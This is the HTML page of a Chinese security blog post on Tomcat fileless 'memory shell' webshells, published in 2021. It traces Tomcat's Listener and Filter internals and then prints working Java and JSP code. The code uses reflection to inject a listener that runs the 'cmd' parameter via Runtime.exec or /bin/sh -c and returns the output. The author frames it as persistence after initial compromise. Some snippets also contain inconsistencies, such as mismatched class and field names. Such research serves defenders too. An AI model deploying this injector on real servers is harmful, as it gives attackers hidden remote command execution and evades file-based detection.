@@ -1,0 +1,249 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>java安全中几个重要机制 | ConsT27's Blog</title><meta name="keywords" content="tomcat Listener，Filter内存马简要分析"><meta name="author" content="ConsT27"><meta name="copyright" content="ConsT27"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="tomcat内存马tomcat 容器tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图  详细解读一下这个图。 一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。 一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全中几个重要机制">
+<meta property="og:url" content="http://const27.com/2021/06/27/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="ConsT27&#39;s Blog">
+<meta property="og:description" content="tomcat内存马tomcat 容器tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图  详细解读一下这个图。 一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。 一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个">
+<meta property="og:locale">
+<meta property="og:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bj.png">
+<meta property="article:published_time" content="2021-06-27T04:33:31.631Z">
+<meta property="article:modified_time" content="2021-06-27T04:32:53.963Z">
+<meta property="article:author" content="ConsT27">
+<meta property="article:tag" content="tomcat Listener，Filter内存马简要分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bj.png"><link rel="shortcut icon" href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219183209.png"><link rel="canonical" href="http://const27.com/2021/06/27/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-27 12:32:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="ConsT27's Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">42</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/2021/02/19/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://const27blog.oss-cn-beijing.aliyuncs.com/img/bj.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ConsT27's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/2021/02/19/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">java安全中几个重要机制</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-06-27T04:33:31.631Z" title="Created 2021-06-27 12:33:31">2021-06-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-06-27T04:32:53.963Z" title="Updated 2021-06-27 12:32:53">2021-06-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="tomcat内存马"><a href="#tomcat内存马" class="headerlink" title="tomcat内存马"></a>tomcat内存马</h1><h2 id="tomcat-容器"><a href="#tomcat-容器" class="headerlink" title="tomcat 容器"></a>tomcat 容器</h2><p>tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210406203203615.png" alt="image-20210406203203615"></p>
+<p>详细解读一下这个图。</p>
+<p>一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。</p>
+<p>一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个Context。</p>
+<p>一个WEB应用中肯定也有多个访问路径，比如说OA可能就有登录，前端展示，搜索等。所以对于每一个访问路径tomcat都会分配一个Wrapper，每一个Wrapper对应一个Servlet，用于处理特定请求。</p>
+<h2 id="Listener-内存马"><a href="#Listener-内存马" class="headerlink" title="Listener 内存马"></a>Listener 内存马</h2><p>tomcat收到请求时，处理顺序是 Listener-&gt;Filter-&gt;Servlet。<br>也就是说Listener是最先接触到数据请求的，我们可以在Listener上做手脚从而达到内存马的目的。</p>
+<p>实际上，我们想实现一个内存马，思路便是想让tomcat执行一段恶意程序，把恶意的listener或者filter类写入tomcat内存中，由于tomcat处理请求时，请求会被listener和filter处理（也就是说会被我们的恶意类处理），因此达到隐蔽的木马功能。</p>
+<p>具体怎么个实现呢？我们可以大致想象一个思路：获取服务器初步权限后，创建一个JSP并向内写入向内存注入恶意Listener或filter的代码，随后访问JSP触发JSP代码，恶意Listener或filter被注入内存，随后删除JSP，通过恶意Listener或filter实现无文件webshell。但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错，具体解决方法就是下文的内容了：</p>
+<h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>如果我们想添加一个Listener，那么势必会用到一个方法：addListener。</p>
+<p>我们来分析以下这个方法，想办法通过addListener方法把恶意Listener注入内存。<br>首先addListener方法是这么用的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">servletContext.addListener(&quot;&quot;);</span><br></pre></td></tr></table></figure>
+<p>我们直接跟进addListener，会发现跟进到了ServletContext这个接口类。</p>
+<p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210626150246949.png" alt="image-20210626150246949"></p>
+<p>那么实现addListener的类是什么呢？换句话说，servletContext这个实例化对象是如何被实例化的呢？</p>
+<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626150652699.png" alt="image-20210626150652699"></p>
+<p>通过调试，我们发现servletContext这个对象实际上是一个ApplicationContextFacade对象。<br>我们跟进到ApplicationContextFacade.class中，查看addListener方法的实现。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626151054515.png" alt="image-20210626151054515"></p>
+<p>发现实际上是调用了ApplicationContext类的addListener方法。再次跟进。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626153212402.png" alt="image-20210626153212402"></p>
+<p>这里还调用了一个addListener，再次跟进。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154012832.png" alt="image-20210626154012832"></p>
+<p>这里借用的别人的图，可以发现如果服务器已启动，那么通过直接调用addListener是无法添加监听器的。</p>
+<p>究其原因，便是此处的context是StandardContext，它的状态是开始状态，无法在if判断中返回true。<br>这也就是上文提到的  “但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错”</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154229868.png" alt="image-20210626154229868"></p>
+<p>如果能够突破if判断，来到此处，那么监听器就会被顺利的添加上</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626155428011.png" alt="image-20210626155428011"></p>
+<h3 id="编写Listener内存马"><a href="#编写Listener内存马" class="headerlink" title="编写Listener内存马"></a>编写Listener内存马</h3><p>既然阻碍我们添加Listener的原因已经找到了，那么就应该考虑如何绕过这个限制了。<br>很简单，通过反射即可绕过这个限制。</p>
+<p>在编写反射代码之前，我们有必要去看一下，我们怎样才能通过反射”够到”StandardContext的addApplicationEventListener方法。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626160137366.png" alt="image-20210626160137366"></p>
+<p>可以直观的看到，我们可以通过servletContext获得它的context属性（ApplicationContext对象），然后通过ApplicationContext对象的context获得StandardContext对象，然后调用addApplicationEventListener方法。很好。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射代码</span><br><span class="line">            ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">            Field field &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(servletContext);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            standardContext.addApplicationEventListener(new MyListener(request,response)); &#x2F;&#x2F;这一行是将某个Listener类添加到监听器</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">恶意Listener</span><br><span class="line">public class MyListenr implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">    public ServletResponse response;</span><br><span class="line">    public ServletRequest request;</span><br><span class="line"></span><br><span class="line">    MyListenr(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">        this.request &#x3D; request;</span><br><span class="line">        this.response &#x3D; response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            this.response.getWriter().write(result);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实验一下</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162713503.png" alt="image-20210626162713503"></p>
+<p>我们先访问/a路由，让代码被执行。然后到任意页面传入恶意参数</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162750746.png" alt="image-20210626162750746"></p>
+<p>SUCCESS。</p>
+<p>为了更方便的注入内存马，我从网上嫖了一个JSP（Linux版）。只要我们上传该JSP然后访问它一下，内存马就被注入了，十分的方便。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;javax.servlet.annotation.WebServlet&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">     ListenH listenH &#x3D; new ListenH(request, response);</span><br><span class="line">    standardContext.addApplicationEventListener(listenH);</span><br><span class="line">    out.print(&quot;test&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    public class ListenH implements ServletRequestListener &#123;</span><br><span class="line">        public ServletResponse response;</span><br><span class="line">        public ServletRequest request;</span><br><span class="line"></span><br><span class="line">        ListenH(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">            this.request &#x3D; request;</span><br><span class="line">            this.response &#x3D; response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">            String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                String line;</span><br><span class="line">                while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                    sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                String result &#x3D; sb.toString();</span><br><span class="line">                this.response.getWriter().write(result);</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                System.out.println(&quot;error &quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Filter-内存马"><a href="#Filter-内存马" class="headerlink" title="Filter 内存马"></a>Filter 内存马</h2><p>Filter内存马与Listener内存马还是有点区别的，要复杂一点点</p>
+<h3 id="doFilter方法如何被执行？"><a href="#doFilter方法如何被执行？" class="headerlink" title="doFilter方法如何被执行？"></a>doFilter方法如何被执行？</h3><h4 id="配置filter"><a href="#配置filter" class="headerlink" title="配置filter"></a>配置filter</h4><p>再开始分析Filter内存马时，我们需要先知道，Filter类中的doFilter方法是如何被执行的。</p>
+<p>OK我们先创建好一个Filter。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Filter类代码</span><br><span class="line">public class MyFilter implements ServletRequestListener &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Filter!&quot;);</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来在web.xml中添加Filter。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626193215688.png" alt="image-20210626193215688"></p>
+<p>我们在doFilter方法处下断点，运行，得到调用帧如下</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204005990.png" alt="image-20210626204005990"></p>
+<h4 id="filterchain"><a href="#filterchain" class="headerlink" title="filterchain"></a>filterchain</h4><p>我们从StandardWrapperValue#invoke 处开始分析.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure>
+<p>那么这个filterChain是什么？我们跟进一下</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204524626.png" alt="image-20210626204524626"></p>
+<p>再度跟进到createFilterChain方法，来到了ApplicationFilterFactory.java里。</p>
+<p>比较关键的代码是这里。这个方法会遍历FilterMaps，检测每个FilterMap项对应的那个Filter与请求的路由等是否一致。若一致则将以该filter的name为参数去FilterConfigs里去寻找对应的FilterConfig,然后将该filterconfig放入filterchain中。不一致的则抛弃。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204752458.png" alt="image-20210626204752458"></p>
+<h4 id="filterconfig与filterdef"><a href="#filterconfig与filterdef" class="headerlink" title="filterconfig与filterdef"></a>filterconfig与filterdef</h4><p>那么filterconfig又是个什么样的东西呢？</p>
+<p>我们跟进context.findFilterConfig,这里的context是StandardContext。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205344727.png" alt="image-20210626205344727"></p>
+<p>再度跟进filterconfigs，就可以很明显的发现filterconfigs是一个hashmap结构 键为filter名，值为filterconfig<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205418654.png" alt="image-20210626205418654"></p>
+<p>那么filterconfig的结构又是如何。我们跟进ApplicationFilterConfig类。下图是此类的构造函数</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205854332.png" alt="image-20210626205854332"></p>
+<p>关键地方圈出来了是与filterdef有关的代码。在构造函数的时候将传入context和filterdef，然后再通过对filterdef调用getfilter获得filter类（即我们自己定义的filter类）。<br> 我们再看看filterDef的关键代码</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210144048.png" alt="image-20210626210144048"><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210116555.png" alt="image-20210626210116555"></p>
+<p>OKOK，上面就是FilterConfig，FilterChain和FilterDef的一些零碎的介绍。<br>我们大致可以得到下列关键信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FilterConfigs 是一个HashMap结构，键为filter名，值为filterconfig</span><br><span class="line">filterconfig包含了filterdef</span><br><span class="line">filterdef直接与filter类相关联</span><br></pre></td></tr></table></figure>
+<p>StandardWrapperValue#invoke 这一层分析完了，这一层是最麻烦的，向下两层将会亲切很多。</p>
+<h4 id="下面的两层"><a href="#下面的两层" class="headerlink" title="下面的两层"></a>下面的两层</h4><p>向下分析来到ApplicationFilterChain#doFilter.这一层很简单，调了个internalDofilter就没了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210643466.png" alt="image-20210626210643466"></p>
+<p>再向下分析来到ApplicationFilterChain#internalDoFilter。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210808889.png" alt="image-20210626210808889"></p>
+<p>关键的地方圈出来了，大致就是通过filterchain里的filterconfig的getFilter方法（下图为getFilter方法，可以明显看到是返回了filter）从而获得filterdef里的filter，从而调用filter的dofilter，这就是大概的流程。</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627113023603.png" alt="image-20210627113023603"></p>
+<h4 id="加载过程流程图"><a href="#加载过程流程图" class="headerlink" title="加载过程流程图"></a>加载过程流程图</h4><p>文字总是有些贫瘠的，用图来说话就会明了许多。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627115155496.png" alt="image-20210627115155496"></p>
+<h3 id="FilterDef添加"><a href="#FilterDef添加" class="headerlink" title="FilterDef添加"></a>FilterDef添加</h3><p>我们如何把FilterDef与我们的Filter关联起来并添加到standardContext中呢？这个问题比较关键，因为我们必须将我们的FilterDef注入到内存才能让我们的Filter有被调用的可能性。</p>
+<p>实际上呢，也很简单。流程上来说与Listener内存马差不多</p>
+<p>打断点</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122501784.png" alt="image-20210627122501784"></p>
+<p>跟进<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122632548.png" alt="image-20210627122632548"></p>
+<p>再跟</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122645331.png" alt="image-20210627122645331"></p>
+<p>继续跟</p>
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122745165.png" alt="image-20210627122745165"></p>
+<p>来到此处，与Listener内存马神似。<br>if判断里判断了程序是否在运行<br>context是standardContext，这里调用了它的addFilterDef来添加FilterDef。</p>
+<h3 id="编写Filter内存马"><a href="#编写Filter内存马" class="headerlink" title="编写Filter内存马"></a>编写Filter内存马</h3><p>既然流程已经明白了，那写起来就不难了.<br>至于为什么要用反射，原因和Listener是一样的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射代码</span><br><span class="line">try &#123;</span><br><span class="line">            response.getWriter().write(&quot;a&quot;);</span><br><span class="line">            System.out.println(&quot;Servlet Get Message\n&quot;);</span><br><span class="line">            Object obj &#x3D; request.getServletContext();</span><br><span class="line">            Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            &#x2F;&#x2F;获取standardContext</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">            filterDef.setFilter(new MyFilter());</span><br><span class="line">            filterDef.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            &#x2F;&#x2F;将FilterDef与filter关联，注入到内存</span><br><span class="line"></span><br><span class="line">            field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterMaps&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            HashMap filterConfigs &#x3D; (HashMap) field.get(standardContext);&#x2F;&#x2F;获取filterConfigs</span><br><span class="line">            Constructor constructor &#x3D;</span><br><span class="line">                    Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).</span><br><span class="line">                            getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line">            &#x2F;&#x2F;将包含filterDef的filterConfig添加到filterConfigs</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">            filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">            filterMap.setFilterName(&quot;Myfilter&quot;);</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#x2F;&#x2F;将该filterMap与filterConfig进行NAME绑定并放到filterMaps的首位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
